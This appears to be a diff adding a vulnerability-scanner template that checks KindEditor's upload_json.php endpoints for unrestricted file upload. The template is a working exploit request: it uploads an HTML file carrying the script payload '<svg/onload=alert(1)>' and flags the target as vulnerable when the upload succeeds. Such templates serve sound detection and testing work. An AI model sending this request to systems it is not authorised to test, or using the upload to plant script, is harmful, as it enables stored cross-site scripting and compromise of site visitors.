@@ -1,0 +1,31 @@
+id: kindeditor-remote-file-upload
+info:
+  name: KindEditor Remote File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-upload, kindeditor
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/php/upload_json.php?dir=file"
+      - "{{BaseURL}}/kindeditor/php/upload_json.php?dir=file"
+      - "{{BaseURL}}/editor/php/upload_json.php?dir=file"
+    headers:
+      Content-Type: "multipart/form-data; boundary=------------------------daab1327fd8a25d1"
+    body: |-
+      --------------------------daab1327fd8a25d1
+      Content-Disposition: form-data; name="imgFile"; filename="test.html"
+      Content-Type: text/html
+
+      <svg/onload=alert(1)>
+      --------------------------daab1327fd8a25d1--
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "attached"
+      - type: regex
+        part: body
+        regex:
+          - "\\{\\\"error\\\":0,\\\"url\\\":"
